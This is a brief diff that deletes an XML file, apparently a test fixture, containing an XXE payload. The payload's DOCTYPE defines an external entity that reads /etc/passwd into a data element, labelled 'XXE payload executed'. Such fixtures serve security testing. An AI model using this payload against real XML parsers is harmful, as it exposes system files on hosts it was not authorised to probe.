@@ -1,8 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE root [
-    <!ENTITY file_content SYSTEM "file:///etc/passwd">
-]>
-<data>
-    <user_data>&file_content;</user_data>
-    <note>XXE payload executed</note>
-</data>
